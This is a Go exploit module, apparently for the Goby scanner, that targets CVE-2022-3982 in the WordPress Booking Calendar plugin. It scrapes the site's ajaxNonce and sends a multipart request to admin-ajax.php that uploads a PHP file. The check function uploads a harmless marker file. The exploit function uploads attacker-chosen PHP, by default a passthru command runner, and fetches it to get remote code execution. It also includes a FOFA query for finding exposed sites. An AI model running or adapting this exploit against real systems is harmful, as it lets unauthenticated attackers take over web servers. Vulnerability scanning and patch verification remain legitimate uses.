package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "WordPress booking-calendar admin-ajax.php File Upload (CVE-2022-3982)",
    "Description": "<p>WordPress booking-calendar is a plugin for creating booking system scheduling calendars for WordPress sites.</p><p>WordPress Plugin Booking Calendar versions before 3.2.2 have a code problem vulnerability. The vulnerability stems from the fact that the plugin does not verify uploaded files and allows unauthenticated users to upload arbitrary files. Attackers can exploit this vulnerability to achieve RCE.</p>",
    "Product": "wp-content/plugins/booking-calendar/",
    "Homepage": "https://wordpress.org/plugins/booking-calendar/",
    "DisclosureDate": "2022-12-13",
    "Author": "corp0ra1",
    "FofaQuery": "body=\"wp-content/plugins/booking-calendar/\"",
    "GobyQuery": "body=\"wp-content/plugins/booking-calendar/\"",
    "Level": "3",
    "Impact": "<p>WordPress Plugin Booking Calendar versions before 3.2.2 have a code problem vulnerability. The vulnerability stems from the fact that the plugin does not verify uploaded files and allows unauthenticated users to upload arbitrary files. Attackers can exploit this vulnerability to achieve RCE.</p>",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch is: <a href=\"https://wpscan.com/vulnerability/4d91f3e1-4de9-46c1-b5ba-cc55b7726867\">https://wpscan.com/vulnerability/4d91f3e1-4de9-46c1-b5ba-cc55b7726867</a></p>",
    "References": [
        "https://wpscan.com/vulnerability/4d91f3e1-4de9-46c1-b5ba-cc55b7726867"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "fileContent",
            "type": "input",
            "value": "<?php passthru(\"id\"); ?>",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        "CVE-2022-3982"
    ],
    "CNNVD": [
        "CNNVD-202212-2917"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "WordPress booking-calendar 插件 admin-ajax.php 任意文件上传漏洞（CVE-2022-3982）",
            "Product": "wp-content/plugins/booking-calendar/",
            "Description": "<p>WordPress booking-calendar是一款用于为WordPress网站创建预订系统安排日历的插件。<br></p><p>WordPress Plugin Booking Calendar 3.2.2之前版本存在代码问题漏洞，该漏洞源于该插件不验证上传的文件，允许未经身份验证的用户上传任意文件，攻击者利用该漏洞可以实现 RCE。<br></p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，补丁获取链接：<a href=\"https://wpscan.com/vulnerability/4d91f3e1-4de9-46c1-b5ba-cc55b7726867\">https://wpscan.com/vulnerability/4d91f3e1-4de9-46c1-b5ba-cc55b7726867</a><br></p>",
            "Impact": "<p>WordPress Plugin Booking Calendar 3.2.2之前版本存在代码问题漏洞，该漏洞源于该插件不验证上传的文件，允许未经身份验证的用户上传任意文件，攻击者利用该漏洞可以实现 RCE。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "WordPress booking-calendar admin-ajax.php File Upload (CVE-2022-3982)",
            "Product": "wp-content/plugins/booking-calendar/",
            "Description": "<p>WordPress booking-calendar is a plugin for creating booking system scheduling calendars for WordPress sites.<br></p><p>WordPress Plugin Booking Calendar versions before 3.2.2 have a code problem vulnerability. The vulnerability stems from the fact that the plugin does not verify uploaded files and allows unauthenticated users to upload arbitrary files. Attackers can exploit this vulnerability to achieve RCE.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch is: <a href=\"https://wpscan.com/vulnerability/4d91f3e1-4de9-46c1-b5ba-cc55b7726867\">https://wpscan.com/vulnerability/4d91f3e1-4de9-46c1-b5ba-cc55b7726867</a><br></p>",
            "Impact": "<p>WordPress Plugin Booking Calendar versions before 3.2.2 have a code problem vulnerability. The vulnerability stems from the fact that the plugin does not verify uploaded files and allows unauthenticated users to upload arbitrary files. Attackers can exploit this vulnerability to achieve RCE.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10774"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = true
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil && strings.Contains(resp.RawBody, "\"ajaxNonce\":\"") {
				ajaxNonce := regexp.MustCompile("\"ajaxNonce\":\"(.*?)\",\"").FindStringSubmatch(resp.RawBody)

				fileName := goutils.RandomHexString(6)
				uri2 := "/wp-admin/admin-ajax.php"
				cfg2 := httpclient.NewPostRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				cfg2.Header.Store("Content-Type", "multipart/form-data; boundary=------------------------95cedb90c1c905f6")
				cfg2.Data = fmt.Sprintf("--------------------------95cedb90c1c905f6\r\nContent-Disposition: form-data; name=\"action\"\r\n\r\nwpdevart_form_ajax\r\n--------------------------95cedb90c1c905f6\r\nContent-Disposition: form-data; name=\"wpdevart_id\"\r\n\r\nx\r\n--------------------------95cedb90c1c905f6\r\nContent-Disposition: form-data; name=\"wpdevart_nonce\"\r\n\r\n%s\r\n--------------------------95cedb90c1c905f6\r\nContent-Disposition: form-data; name=\"wpdevart_data\"\r\n\r\n{\"wpdevart-submit\":\"X\"}\r\n--------------------------95cedb90c1c905f6\r\nContent-Disposition: form-data; name=\"wpdevart-submit\"\r\n\r\n1\r\n--------------------------95cedb90c1c905f6\r\nContent-Disposition: form-data; name=\"file\"; filename=\"%s.php\"\r\nContent-Type: application/octet-stream\r\n\r\n<?php echo md5(131);unlink(__FILE__);?>\r\n--------------------------95cedb90c1c905f6--", ajaxNonce[1], fileName)
				if _, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
					uri3 := fmt.Sprintf("/wp-content/uploads/booking_calendar/%s.php", fileName)
					cfg3 := httpclient.NewGetRequestConfig(uri3)
					cfg3.VerifyTls = false
					cfg3.FollowRedirect = false
					if resp3, err := httpclient.DoHttpRequest(u, cfg3); err == nil {
						return strings.Contains(resp3.RawBody, "1afa34a7f984eeabdbb0a7d494132ee5")

					}
				}
			}

			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			fileContent := ss.Params["fileContent"].(string)
			uri := "/"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = true
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil && strings.Contains(resp.RawBody, "\"ajaxNonce\":\"") {
				ajaxNonce := regexp.MustCompile("\"ajaxNonce\":\"(.*?)\",\"").FindStringSubmatch(resp.RawBody)
				fileName := goutils.RandomHexString(6)
				uri2 := "/wp-admin/admin-ajax.php"
				cfg2 := httpclient.NewPostRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				cfg2.Header.Store("Content-Type", "multipart/form-data; boundary=------------------------95cedb90c1c905f6")
				cfg2.Data = fmt.Sprintf("--------------------------95cedb90c1c905f6\r\nContent-Disposition: form-data; name=\"action\"\r\n\r\nwpdevart_form_ajax\r\n--------------------------95cedb90c1c905f6\r\nContent-Disposition: form-data; name=\"wpdevart_id\"\r\n\r\nx\r\n--------------------------95cedb90c1c905f6\r\nContent-Disposition: form-data; name=\"wpdevart_nonce\"\r\n\r\n%s\r\n--------------------------95cedb90c1c905f6\r\nContent-Disposition: form-data; name=\"wpdevart_data\"\r\n\r\n{\"wpdevart-submit\":\"X\"}\r\n--------------------------95cedb90c1c905f6\r\nContent-Disposition: form-data; name=\"wpdevart-submit\"\r\n\r\n1\r\n--------------------------95cedb90c1c905f6\r\nContent-Disposition: form-data; name=\"file\"; filename=\"%s.php\"\r\nContent-Type: application/octet-stream\r\n\r\n%s\r\n--------------------------95cedb90c1c905f6--", ajaxNonce[1], fileName, fileContent)
				if _, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil {
					uri3 := fmt.Sprintf("/wp-content/uploads/booking_calendar/%s.php", fileName)
					cfg3 := httpclient.NewGetRequestConfig(uri3)
					cfg3.VerifyTls = false
					cfg3.FollowRedirect = false
					if resp3, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg3); err == nil {
						expResult.Output = resp3.RawBody
						expResult.Success = true

					}
				}
			}
			return expResult
		},
	))
}